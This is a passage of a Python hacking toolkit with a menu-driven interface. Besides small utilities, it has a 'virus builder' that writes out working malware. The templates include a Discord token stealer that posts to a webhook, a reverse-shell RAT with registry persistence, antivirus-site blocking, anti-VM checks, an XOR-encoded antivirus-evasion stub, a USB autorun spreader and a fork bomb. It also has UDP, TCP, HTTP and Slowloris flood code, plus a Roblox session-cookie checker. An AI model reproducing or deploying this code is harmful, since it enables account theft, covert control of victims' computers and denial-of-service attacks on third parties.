                print(f"\n{OK} {G}{w}{RST} ({a})"); _hist_log("UTIL","Crack",f"{a}:{w}"); pause(); return
    print(f"{ERR} {T('not_found')}"); pause()
def u_dark():
    banner_s("DARK WEB"); links = []
    for n, u in [("Torch","http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion"),
                 ("Ahmia","https://ahmia.fi/"),
                 ("Hidden Wiki","http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion")]:
        print(f"  {G}{n:<16}{RST} {DIM}{u}{RST}"); links.append(f"{n}: {u}")
    _hist_log("UTIL","Dark","ok"); clip_pause("\n".join(links))
def u_uuid():
    banner_s("UUID"); import uuid; ids = []
    for i in range(ask_int("Count:", 10)):
        u = str(uuid.uuid4()); print(f"  {G}[{i+1}]{RST} {u}"); ids.append(u)
    _hist_log("UTIL","UUID",str(len(ids))); clip_pause("\n".join(ids))
def u_mac():
    banner_s("MAC GEN"); macs = []
    for _ in range(ask_int("Count:", 10)):
        m = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
        print(f"  {G}→{RST} {m}"); macs.append(m)
    _hist_log("UTIL","Mac",str(len(macs))); clip_pause("\n".join(macs))
def u_jwt():
    banner_s("JWT DECODE"); p = ask("JWT:").split(".")
    if len(p) != 3: print(f"{ERR} {T('invalid')}"); pause(); return
    try:
        dp = lambda x: json.loads(base64.urlsafe_b64decode((x + "=" * ((4 - len(x) % 4) % 4)).encode()))
        print(f"\n  {Y}HEADER{RST}:"); pkv(dp(p[0]), 1)
        print(f"\n  {Y}PAYLOAD{RST}:"); pkv(dp(p[1]), 1)
        _hist_log("UTIL","JWT","ok")
    except Exception as e: print(f"{ERR} {e}")
    pause()
def u_conv():
    banner_s("TEXT CONV"); m = ask("[1]T→B [2]T→H [3]B→T [4]H→T:", "1"); t = ask("Input:")
    try:
        o = {"1": lambda: " ".join(format(ord(c), "08b") for c in t),
             "2": lambda: " ".join(format(ord(c), "02x") for c in t),
             "3": lambda: "".join(chr(int(b, 2)) for b in t.split()),
             "4": lambda: bytes.fromhex(t.replace(" ", "")).decode()}.get(m, lambda: "")()
        print(f"\n{OK} {G}{o}{RST}"); _hist_log("UTIL","Conv",m); clip_pause(o)
    except Exception as e: print(f"{ERR} {e}"); pause()
def u_dbs():
    banner_s("DB SEARCH"); q = ask("Query:"); links = []
    for n, u in [("HIBP", f"https://haveibeenpwned.com/account/{q}"),
                 ("Dehashed", f"https://dehashed.com/search?query={q}"),
                 ("LeakCheck", f"https://leakcheck.io/?query={q}"),
                 ("IntelX", f"https://intelx.io/?s={q}")]:
        print(f"  {G}[{n}]{RST} {DIM}{u}{RST}"); links.append(u)
    _hist_log("UTIL","DB",q); clip_pause("\n".join(links))
def u_caesar():
    banner_s("CAESAR"); t = ask("Text:"); s = ask_int("Shift:", 13)
    if ask("(e)/(d):", "e") == "d": s = -s
    r = "".join(chr((ord(c) - ord('A' if c.isupper() else 'a') + s) % 26 + ord('A' if c.isupper() else 'a'))
                if c.isalpha() else c for c in t)
    print(f"\n{OK} {G}{r}{RST}"); _hist_log("UTIL","Caesar",t[:20]); clip_pause(r)
def u_zip():
    banner_s("ZIP CRACK"); zp = ask("ZIP path:")
    if not os.path.isfile(zp): print(f"{ERR} {T('not_found')}"); pause(); return
    import zipfile
    for w in ["password","123456","admin","qwerty","letmein","welcome","1234"]:
        try:
            zipfile.ZipFile(zp).extractall(pwd=w.encode())
            print(f"\n{OK} {G}{w}{RST}"); _hist_log("UTIL","Zip",w); pause(); return
        except Exception: pass
    print(f"{ERR} {T('not_found')}"); pause()
def u_proxy():
    banner_s("PROXY GEN"); n = ask_int("Count:", 20); proxies = []
    for _ in range(n):
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        port = random.choice([80,8080,3128,1080,8888,443])
        p = f"{ip}:{port}"; print(f"  {G}→{RST} {p}"); proxies.append(p)
    out("proxies_gen.txt", "\n".join(proxies)); _hist_log("UTIL","Proxy",str(n)); clip_pause("\n".join(proxies))
def u_baseconv():
    banner_s("BASE CONV"); mode = ask("Input (1=dec 2=hex 3=bin 4=b64 5=b32):", "2"); val = ask("Value:")
    try:
        n = {"1": lambda: int(val, 10), "2": lambda: int(val.replace("0x", ""), 16),
             "3": lambda: int(val.replace(" ", ""), 2),
             "4": lambda: int.from_bytes(base64.b64decode(val), "big"),
             "5": lambda: int.from_bytes(base64.b32decode(val), "big")}.get(mode, lambda: 0)()
        print(f"\n  {Y}Decimal{RST} : {G}{n}{RST}")
        print(f"  {Y}Hex{RST}     : {C}{hex(n)}{RST}")
        print(f"  {Y}Binary{RST}  : {Y}{bin(n)}{RST}")
        b = n.to_bytes((n.bit_length() + 7) // 8 or 1, "big")
        print(f"  {Y}B64{RST}     : {W}{base64.b64encode(b).decode()}{RST}")
        _hist_log("UTIL","BaseConv",mode); pause()
    except Exception as e: print(f"{ERR} {e}"); pause()
def u_regex():
    banner_s("REGEX"); pattern = ask("Pattern:")
    if not pattern: pause(); return
    text = ask("Text or file:")
    if os.path.isfile(text):
        try: text = open(text, encoding="utf-8", errors="ignore").read()
        except Exception: pass
    try:
        ms = list(re.finditer(pattern, text))
        print(f"\n  {Y}Matches{RST}: {G}{len(ms)}{RST}\n")
        for i, m in enumerate(ms[:20], 1):
            print(f"  {G}[{i}]{RST} pos={m.start()} {W}{m.group(0)[:80]!r}{RST}")
        _hist_log("UTIL","Regex",str(len(ms)))
    except re.error as e: print(f"{ERR} {e}")
    pause()
def u_tempmail():
    banner_s("TEMP MAIL")
    try:
        r = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1", timeout=8)
        email = r.json()[0]
    except Exception as e: print(f"{ERR} {e}"); pause(); return
    login, domain = email.split("@")
    print(f"  {Y}Address{RST}: {G}{email}{RST}"); _hist_log("UTIL","TempMail",email)
    if ask("Check inbox? (y/n):", "y").lower() not in ("y","o"): clip_pause(email); return
    seen = set(); start = time.time()
    while time.time() - start < 120:
        try:
            r = requests.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}", timeout=8)
            for m in r.json():
                if m.get("id") in seen: continue
                seen.add(m["id"]); print(f"  {G}[NEW]{RST} {m.get('from')} | {m.get('subject')}")
        except Exception: pass
        time.sleep(8)
    print(f"\n{OK} {len(seen)} messages."); pause()
def u_pwstrength():
    banner_s("PW STRENGTH"); pw = ask("Password:")
    if not pw: pause(); return
    s = 0; L = len(pw)
    for thresh, pts in [(8,15),(12,15),(16,15),(20,10)]:
        if L >= thresh: s += pts
    if re.search(r"[a-z]", pw): s += 5
    if re.search(r"[A-Z]", pw): s += 10
    if re.search(r"\d", pw): s += 10
    if re.search(r"[!@#$%^&*()_+\-=\[\]{};':\",.<>/?\\|`~]", pw): s += 15
    if not re.search(r"(.)\1{2,}", pw): s += 5
    s = min(s, 100)
    col = R if s < 30 else Y if s < 60 else G if s < 85 else BRIGHT
    v = "VERY WEAK" if s < 30 else "WEAK" if s < 50 else "MEDIUM" if s < 70 else "GOOD" if s < 85 else "EXCELLENT"
    print(f"\n  {Y}Score{RST}: {col}{s}/100 ({v}){RST}")
    print(f"  {col}[{'█' * (s*30//100)}{'░' * (30 - s*30//100)}]{RST}")
    _hist_log("UTIL","PWStr",str(s)); pause()
def u_qr():
    banner_s("QR GEN")
    try: import qrcode
    except Exception: _pip("qrcode[pil]"); import qrcode
    data = ask("Content:")
    if not data: pause(); return
    name = ask("Filename:", f"qr_{int(time.time())}")
    try:
        qr = qrcode.QRCode(box_size=10, border=4); qr.add_data(data); qr.make(fit=True)
        os.makedirs("1-Output", exist_ok=True)
        p = f"1-Output/{name}.png"
        qr.make_image(fill_color="black", back_color="white").save(p)
        print(f"\n{OK} → {Y}{p}{RST}"); _hist_log("UTIL","QR",data[:40]); pause()
    except Exception as e: print(f"{ERR} {e}"); pause()
def u_color():
    banner_s("COLOR CONV"); mode = ask("[1]HEX→RGB [2]RGB→HEX [3]HEX→ANSI:", "1")
    if mode == "1":
        h = ask("HEX:").strip().lstrip("#")
        try:
            r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
            print(f"  {Y}RGB{RST}: rgb({r}, {g}, {b})")
        except Exception as e: print(f"{ERR} {e}")
    elif mode == "2":
        try:
            r = max(0, min(255, ask_int("R:", 255)))
            g = max(0, min(255, ask_int("G:", 0)))
            b = max(0, min(255, ask_int("B:", 0)))
            print(f"  {Y}HEX{RST}: #{r:02X}{g:02X}{b:02X}")
        except Exception as e: print(f"{ERR} {e}")
    elif mode == "3":
        h = ask("HEX:").strip().lstrip("#")
        try:
            r, g, b = int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
            if r == g == b: a = 16 if r < 8 else 231 if r > 248 else round(((r - 8) / 247) * 24) + 232
            else: a = 16 + 36 * round(r / 255 * 5) + 6 * round(g / 255 * 5) + round(b / 255 * 5)
            print(f"  {Y}ANSI 256{RST}: {a}")
        except Exception as e: print(f"{ERR} {e}")
    _hist_log("UTIL","Color",mode); pause()
def u_tor():
    banner_s("TOR PROXY")
    try:
        import socks
        import socket as _s
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        _s.socket = socks.socksocket
        s = requests.Session()
        r = s.get("https://check.torproject.org/api/ip", timeout=8).json()
        if not r.get("IsTor"): print(f"  {R}[NOT TOR]{RST} {r}"); pause(); return
        print(f"  {G}[TOR OK]{RST} exit {r.get('IP')}")
        url = ask("URL (empty=ipify):", "https://api.ipify.org")
        rr = s.get(url, timeout=15); print(f"\n  {G}{rr.status_code}{RST} {rr.text[:400]}")
        _hist_log("UTIL","Tor",url[:40])
    except ImportError: _pip("pysocks"); print(f"{INF} pysocks installé, relance.")
    except Exception as e: print(f"{ERR} {e}")
    pause()
_SECRET_SIGS = {
    "AWS Access": r"AKIA[0-9A-Z]{16}",
    "Google API": r"AIza[0-9A-Za-z\-_]{35}",
    "GitHub Pat": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
    "Stripe Live": r"sk_live_[0-9a-zA-Z]{24,}",
    "Discord Bot": r"[MN][A-Za-z0-9]{23,25}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}",
    "Discord WH": r"https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+",
    "JWT": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
    "PrivKey PEM": r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
    "Slack": r"xox[baprs]-[0-9A-Za-z-]{10,}",
    "SendGrid": r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}",
}
def u_sigscan():
    banner_s("SIG SCANNER"); p = ask("File or directory:")
    if not os.path.exists(p): print(f"{ERR} {T('not_found')}"); pause(); return
    files = [p] if os.path.isfile(p) else [os.path.join(r, f) for r, _, fs in os.walk(p) for f in fs
             if not any(s in f for s in (".pyd",".exe",".dll",".zip",".png",".jpg"))]
    total = 0
    for fp in files:
        try: txt = open(fp, "r", encoding="utf-8", errors="ignore").read()
        except Exception: continue
        for name, pat in _SECRET_SIGS.items():
            for m in re.finditer(pat, txt):
                print(f"  {R}[{name}]{RST} {DIM}{fp}{RST}  {Y}{m.group(0)[:80]}{RST}"); total += 1
    print(f"\n{OK} {total} signature(s)."); _hist_log("UTIL","SigScan",f"{p}:{total}"); pause()

# ========================================================================
# VIRUS BUILDER
# ========================================================================
_STEALER = '''# -*- coding: utf-8 -*-
import os, json, socket, platform, re
from datetime import datetime
WH = "__WH__"
try: import requests
except Exception:
    import subprocess as sp; sp.run(["pip","install","requests","--quiet"]); import requests
def info():
    try: ip = requests.get("https://api.ipify.org", timeout=4).text.strip()
    except: ip = "?"
    try: u = os.getlogin()
    except: u = "?"
    return {"host": socket.gethostname(), "user": u, "ip": ip, "os": platform.platform()}
def tokens():
    ad = os.environ.get("APPDATA", ""); lo = os.environ.get("LOCALAPPDATA", "")
    ps = [os.path.join(ad, "Discord", "Local Storage", "leveldb"),
          os.path.join(lo, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")]
    pat = re.compile(r"[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{27,38}|mfa\\.[\\w-]{84}")
    found = []
    for p in ps:
        if not os.path.isdir(p): continue
        for fn in os.listdir(p):
            if not fn.endswith((".log", ".ldb")): continue
            try:
                for tok in pat.findall(open(os.path.join(p, fn), errors="ignore").read()):
                    if tok in [t["token"] for t in found]: continue
                    r = requests.get("https://discord.com/api/v9/users/@me",
                                     headers={"Authorization": tok}, timeout=3)
                    if r.status_code == 200:
                        u = r.json()
                        found.append({"token": tok, "username": u.get("username"),
                                      "email": u.get("email", "N/A")})
            except: pass
    return found
i = info(); t = tokens()
ts = "".join(f"**{x['username']}** | {x['email']}\\n`{x['token']}`\\n" for x in t[:5])
try:
    requests.post(WH, json={"embeds": [{"title": "c6R6 grabber", "color": 0xFF0000, "fields": [
        {"name": "System", "value": f"```{json.dumps(i, indent=2)[:900]}```"},
        {"name": "Tokens", "value": ts[:1000] or "None"}]}]}, timeout=10)
except: pass
'''
_RAT = '''# -*- coding: utf-8 -*-
import os, socket, subprocess, platform, time, base64
HOST = "__HOST__"
PORT = __LPORT__
def persist():
    try:
        import winreg
        s = os.path.abspath(__file__)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'python "{{s}}"')
        winreg.CloseKey(k)
    except: pass
def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab(); path = "_ss.png"; img.save(path)
        with open(path, "rb") as f: data = base64.b64encode(f.read()).decode()
        os.remove(path); return data
    except: return None
def shell():
    while True:
        try:
            s = socket.socket(); s.connect((HOST, PORT))
            s.send(f"[c6R6] {{platform.node()}}\\n".encode())
            while True:
                c = s.recv(4096).decode().strip()
                if not c: continue
                if c.lower() == "exit": s.close(); break
                elif c.lower() == "sysinfo":
                    s.send(f"OS:{{platform.platform()}}\\nUser:{{os.getlogin()}}\\n".encode())
                elif c.lower() == "screenshot":
                    ss = screenshot()
                    s.send(f"[SS]{{ss}}[/SS]\\n".encode() if ss else b"failed\\n")
                else:
                    o = subprocess.run(c, shell=True, capture_output=True, timeout=15)
                    s.send(o.stdout + o.stderr or b"(no output)\\n")
        except: time.sleep(5)
persist(); shell()
'''
_BLOCK_KEY = 'import ctypes, ctypes.wintypes as wt\nu = ctypes.WinDLL("user32")\nP = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wt.WPARAM, wt.LPARAM)\nP = P(lambda n, w, l: 1)\nu.SetWindowsHookExW(13, P, None, 0)\nm = wt.MSG()\nwhile u.GetMessageW(ctypes.byref(m), None, 0, 0) != 0:\n    u.TranslateMessage(ctypes.byref(m)); u.DispatchMessageW(ctypes.byref(m))\n'
_BLOCK_MOUSE = 'import ctypes, time\nu = ctypes.windll.user32\ncx, cy = u.GetSystemMetrics(0)//2, u.GetSystemMetrics(1)//2\nwhile True:\n    u.SetCursorPos(cx, cy); time.sleep(0.01)\n'
_BLOCK_TM = 'import winreg\nk = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_SET_VALUE)\nwinreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)\nwinreg.CloseKey(k)\n'
_BLOCK_AV = 'import platform\nif platform.system() != "Windows": exit()\nfor s in ["virustotal.com","malwarebytes.com","avast.com","avg.com","norton.com"]:\n    try:\n        with open(r"C:\\Windows\\System32\\drivers\\etc\\hosts", "a") as f: f.write(f"\\n127.0.0.1 {s}\\n127.0.0.1 www.{s}")\n    except: pass\n'
_ANTIVM = 'import os, platform, sys, subprocess, socket\nf = []\nif not platform.processor(): f.append("cpu")\nif any(b in socket.gethostname().lower() for b in ["sandbox","virus","vmware"]): f.append("host")\nif platform.system() == "Windows":\n    try:\n        out = subprocess.run(["tasklist"], capture_output=True, text=True).stdout.lower()\n        for p in ["wireshark","procmon","x64dbg","ida"]:\n            if p in out: f.append(p)\n    except: pass\nif f: sys.exit(0)\nprint("Clean.")\n'

def _write(name, content):
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/{name}"; open(p, "w", encoding="utf-8").write(content)
    print(f"\n{OK} → {Y}{p}{RST}"); _hist_log("BUILD","Write",name); pause()

def builder_menu():
    while True:
        menu_box("VIRUS BUILDER", [
            ("1","Full Stealer"),("2","Block Keyboard"),("3","Block Mouse"),
            ("4","Block TaskMgr"),("5","Block AV Sites"),("6","Shutdown"),
            ("7","Anti VM"),("8","Restart Loop"),("9","Fake Error"),
            ("10","Startup Persist"),("11","Fork Bomb"),("12","Reverse Shell"),
            ("13","AV Bypass Stub"),("14","Ransom Note"),("15","USB Spreader"),
            ("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1":
            banner_s("STEALER"); wh = ask("Webhook:"); name = ask("Output:", "stealer.py")
            os.makedirs("1-Output", exist_ok=True)
            fp = f"1-Output/{name}"; open(fp, "w", encoding="utf-8").write(_STEALER.replace("__WH__", wh))
            print(f"\n{OK} → {Y}{fp}{RST}"); _hist_log("BUILD","Stealer",name)
            _ask_exe(fp); pause()
        elif c == "2": banner_s("BLOCK KEY"); _write("block_key.py", _BLOCK_KEY)
        elif c == "3": banner_s("BLOCK MOUSE"); _write("block_mouse.py", _BLOCK_MOUSE)
        elif c == "4": banner_s("BLOCK TASKMGR"); _write("block_taskmgr.py", _BLOCK_TM)
        elif c == "5": banner_s("BLOCK AV"); _write("block_av.py", _BLOCK_AV)
        elif c == "6": banner_s("SHUTDOWN"); _write("shutdown.py", "import os\nos.system('shutdown /s /t 0')\n")
        elif c == "7": banner_s("ANTI VM"); _write("anti_vm.py", _ANTIVM)
        elif c == "8": banner_s("RESTART LOOP"); _write("restart.py", "import os,time\nwhile True:\n    time.sleep(300); os.system('shutdown /r /t 0')\n")
        elif c == "9":
            banner_s("FAKE ERROR"); ti = ask("Title:", "System Error"); ms = ask("Message:", "Critical error.")
            _write("fake_error.py", f'import ctypes\nctypes.windll.user32.MessageBoxW(0, "{ms}", "{ti}", 0x10)\n')
        elif c == "10":
            banner_s("STARTUP PERSIST"); s = ask("Script path:")
            _write("startup.py",
                   'import os, shutil, winreg\n'
                   f'SCRIPT = r"{s}"\n'
                   'SU = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")\n'
                   'shutil.copy2(SCRIPT, SU)\n'
                   'k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)\n'
                   'winreg.SetValueEx(k, "c6r6", 0, winreg.REG_SZ, "python \\"" + SCRIPT + "\\"")\n'
                   'winreg.CloseKey(k)\n')
        elif c == "11": banner_s("FORK BOMB"); _write("forkbomb.bat", ":loop\nstart %0\ngoto loop\n")
        elif c == "12":
            banner_s("REVERSE SHELL")
            lhost = ask("LHOST:"); lport = ask("LPORT:", "4444")
            os.makedirs("1-Output", exist_ok=True)
            fp = "1-Output/revshell.py"
            open(fp, "w", encoding="utf-8").write(
                _RAT.replace("__HOST__", lhost).replace("__LPORT__", str(lport)))
            print(f"\n{OK} → {Y}{fp}{RST}\n  {DIM}Listener: nc -lvnp {lport}{RST}")
            _hist_log("BUILD","Revshell",fp); _ask_exe(fp); pause()
        elif c == "13":
            banner_s("AV BYPASS"); pl = ask("Payload .py:")
            if not os.path.isfile(pl): print(f"{ERR} {T('not_found')}"); pause(); continue
            src = open(pl, encoding="utf-8", errors="ignore").read()
            k = random.randint(1, 254)
            ex = base64.b64encode(bytes(b ^ k for b in src.encode())).decode()
            _write("stub.py", f'import base64\n_k={k}\n_d=base64.b64decode("{ex}")\nexec(bytes(b^_k for b in _d).decode())\n')
        elif c == "14":
            banner_s("RANSOM NOTE")
            uid = hashlib.md5(os.urandom(16)).hexdigest().upper()
            _write("README_DECRYPT.txt", f"Files encrypted. Pay 0.05 BTC.\nID: {uid}\n")
        elif c == "15":
            banner_s("USB SPREADER"); pl = ask("Payload:", "stealer.py")
            _write("usb_spreader.py",
                   'import os, shutil, string\n'
                   f'PAYLOAD = r"{pl}"\n'
                   'for d in string.ascii_uppercase:\n'
                   '    drv = f"{d}:\\\\"\n'
                   '    if os.path.exists(drv):\n'
                   '        try:\n'
                   '            shutil.copy2(PAYLOAD, drv)\n'
                   f'            open(drv + "autorun.inf", "w").write("[AutoRun]\\nopen=python {pl}\\n")\n'
                   '        except: pass\n')
        elif c == "0": break

# ========================================================================
# DDOS
# ========================================================================
def ddos_menu():
    while True:
        menu_box("DDOS", [
            ("1","UDP Flood"),("2","TCP Flood"),("3","HTTP Flood"),
            ("4","Slowloris"),("5","UDP Multi"),("6","Mixed"),
            ("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": d_udp()
        elif c == "2": d_tcp()
        elif c == "3": d_http()
        elif c == "4": d_slow()
        elif c == "5": d_udpmt()
        elif c == "6": d_mixed()
        elif c == "0": break
def _flood(label, fn, dur, threads):
    banner_s(label); stop = {"v": False}; c = [0]
    for _ in range(threads): threading.Thread(target=fn, args=(stop, c), daemon=True).start()
    try:
        e = time.time() + dur
        while time.time() < e:
            print(f"\r  {G}[~]{RST} {c[0]}", end=" "); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"] = True; print(f"\n\n{OK} {c[0]}."); _hist_log("DDOS",label,str(c[0])); pause()
def d_udp():
    h = ask("Target:"); p = ask_int("Port:", 80); dur = ask_int("Duration:", 10)
    def f(stop, c):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = os.urandom(1024)
        while not stop["v"]:
            try: s.sendto(pl, (h, p)); c[0] += 1
            except Exception: pass
    _flood("UDP FLOOD", f, dur, 1)
def d_tcp():
    h = ask("Target:"); p = ask_int("Port:", 80); dur = ask_int("Duration:", 10); th = ask_int("Threads:", 20)
    def f(stop, c):
        while not stop["v"]:
            try:
                s = socket.socket(); s.settimeout(0.1); s.connect_ex((h, p)); s.close(); c[0] += 1
            except Exception: pass
    _flood("TCP FLOOD", f, dur, th)
def d_http():
    url = ask("URL:"); dur = ask_int("Duration:", 10); th = ask_int("Threads:", 50)
    def f(stop, c):
        while not stop["v"]:
            try: requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=2); c[0] += 1
            except Exception: pass
    _flood("HTTP FLOOD", f, dur, th)
def d_slow():
    banner_s("SLOWLORIS"); h = ask("Host:"); p = ask_int("Port:", 80); n = ask_int("Sockets:", 150)
    s = []
    for _ in range(n):
        try:
            so = socket.socket(); so.settimeout(4); so.connect((h, p))
            so.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
            s.append(so)
        except Exception: pass
    print(f"{OK} {len(s)} sockets."); _hist_log("DDOS","Slowloris",str(len(s))); pause()
def d_udpmt():
    h = ask("Target:"); p = ask_int("Port:", 80); dur = ask_int("Duration:", 10); th = ask_int("Threads:", 10)
    def f(stop, c):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = os.urandom(1024)
        while not stop["v"]:
            try: s.sendto(pl, (h, p)); c[0] += 1
            except Exception: pass
    _flood("UDP MULTI", f, dur, th)
def d_mixed():
    h = ask("Target:"); dur = ask_int("Duration:", 15)
    stop = {"v": False}; c = {"udp": 0, "tcp": 0, "http": 0}
    def fu():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = os.urandom(1024)
        while not stop["v"]:
            try: s.sendto(pl, (h, random.randint(1, 65535))); c["udp"] += 1
            except Exception: pass
    def ft():
        while not stop["v"]:
            try:
                s = socket.socket(); s.settimeout(0.1); s.connect_ex((h, random.randint(1, 65535))); s.close(); c["tcp"] += 1
            except Exception: pass
    def fh():
        while not stop["v"]:
            try:
                for port in (80, 443): requests.get(f"http://{h}:{port}", timeout=1); c["http"] += 1
            except Exception: pass
    banner_s("MIXED FLOOD")
    for _ in range(5):
        for fn in (fu, ft, fh): threading.Thread(target=fn, daemon=True).start()
    try:
        e = time.time() + dur
        while time.time() < e:
            print(f"\r  UDP:{c['udp']} TCP:{c['tcp']} HTTP:{c['http']}", end=" "); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"] = True; print(f"\n\n{OK} {sum(c.values())}.")
    _hist_log("DDOS","Mixed",str(sum(c.values()))); pause()

# ========================================================================
# ROBLOX
# ========================================================================
def roblox_menu():
    while True:
        menu_box("ROBLOX", [
            ("1","Cookie Info"),("2","User by Name"),("3","User by ID"),
            ("4","Game Info"),("5","Search Users"),("6","Group Info"),("7","Avatar"),
            ("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": rb_cookie()
        elif c == "2": rb_name()
        elif c == "3": _rb_p(ask("ID:")); pause()
        elif c == "4": rb_game()
        elif c == "5": rb_search()
        elif c == "6": rb_group()
        elif c == "7": rb_avatar()
        elif c == "0": break
def rb_cookie():
    banner_s("COOKIE INFO"); ck = ask(".ROBLOSECURITY:")
    h = {"Cookie": f".ROBLOSECURITY={ck}"}
    try:
        r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h, timeout=8)
        if r.status_code != 200: print(f"{ERR} {T('invalid')}"); pause(); return
        d = r.json(); uid = d.get("id")
        rb = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h, timeout=8).json()
        fr = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", headers=h, timeout=8).json()
        pr = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=h, timeout=8)
        print(f"\n  {Y}Username{RST}: {d.get('name')}")
        print(f"  {Y}ID      {RST}: {uid}")
        print(f"  {Y}Robux   {RST}: {rb.get('robux', '?')}")
        print(f"  {Y}Friends {RST}: {fr.get('count', '?')}")
        print(f"  {Y}Premium {RST}: {pr.status_code == 200}")
        _hist_log("RBX","Cookie",d.get("name","?"))
    except Exception as e: print(f"{ERR} {e}")
    pause()
def rb_name():
    banner_s("USER BY NAME"); u = ask("Username:")
    r = requests.post("https://users.roblox.com/v1/usernames/users",
                      json={"usernames": [u], "excludeBannedUsers": False}, timeout=8).json()
    if r.get("data"): _rb_p(r["data"][0]["id"])
    else: print(f"{ERR} {T('not_found')}")
    pause()
def _rb_p(uid):
    try:
        r = requests.get(f"https://users.roblox.com/v1/users/{uid}", timeout=8).json()
        fr = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", timeout=8).json()
        for k in ["id","name","displayName","created","isBanned"]:
            print(f"  {Y}{k:<12}{RST} {W}{r.get(k)}{RST}")
        print(f"  {Y}Friends     {RST} {W}{fr.get('count', '?')}{RST}")
        _hist_log("RBX","User",str(uid))
    except Exception as e: print(f"{ERR} {e}")
def rb_game():
    banner_s("GAME INFO"); g = ask("Universe ID:")
    r = requests.get(f"https://games.roblox.com/v1/games?universeIds={g}", timeout=8).json()
    if r.get("data"):
        for k in ["name","playing","visits","maxPlayers","favoritedCount"]:
            print(f"  {Y}{k:<14}{RST} {W}{r['data'][0].get(k)}{RST}")
    _hist_log("RBX","Game",g); pause()
def rb_search():
    banner_s("SEARCH USERS")
    r = requests.get(f"https://users.roblox.com/v1/users/search?keyword={ask('Query:')}&limit=25", timeout=8).json()
    if r.get("data"):
        for u in r["data"]: print(f"  {G}→{RST} {u['name']:<20} {DIM}{u['id']}{RST}")
    _hist_log("RBX","Search","ok"); pause()
def rb_group():
    banner_s("GROUP INFO")
    r = requests.get(f"https://groups.roblox.com/v1/groups/{ask('ID:')}", timeout=8).json()
    for k in ["name","memberCount","publicEntryAllowed"]:
        print(f"  {Y}{k:<20}{RST} {W}{r.get(k)}{RST}")
    _hist_log("RBX","Group","ok"); pause()
def rb_avatar():
    banner_s("AVATAR")
    r = requests.get(f"https://avatar.roblox.com/v1/users/{ask('User ID:')}/avatar", timeout=8).json()
    if r.get("scales"):
        for k, v in r["scales"].items(): print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
    _hist_log("RBX","Avatar","ok"); pause()

# ========================================================================
# WEB TOOLS
# ========================================================================
def web_menu():
    while True:
        menu_box("WEB TOOLS", [
            ("1","Tech Detect"),("2","CMS Detect"),("3","Admin Finder"),("4","Dir Brute"),
            ("5","SQLi"),("6","XSS"),("7","JWT"),("8","WAF"),("9","Shortener"),
            ("10","Pastebin"),("11","LFI"),("12","SSRF"),("13","Vuln Scan"),
            ("14","Takeover"),("15","JS Secrets"),("16","Defang"),("17","HTTP Methods"),
            ("0", T("back"))])
        c = input(f"  {R}>{RST} ").strip()
        fns = {"1": w_tech, "2": w_cms, "3": w_admin, "4": w_dir, "5": w_sqli,
               "6": w_xss, "7": w_jwt, "8": w_waf, "9": w_short, "10": w_paste,
               "11": w_lfi, "12": w_ssrf, "13": w_vuln, "14": w_takeover,
               "15": w_js, "16": w_defang, "17": w_http}
        fn = fns.get(c)
        if fn: fn()
        elif c == "0": break
def w_tech():
    banner_s("TECH DETECT"); url = ask("URL:")
    try:
        r = requests.get(url, timeout=8); t = r.text.lower(); h = r.headers
        for n, d in {"WordPress":"wp-content" in t, "React":"react" in t,
                     "jQuery":"jquery" in t, "PHP":"PHP" in h.get("X-Powered-By",""),
                     "Nginx":"nginx" in h.get("Server","").lower(),
                     "Cloudflare":"cloudflare" in h.get("Server","").lower()}.items():
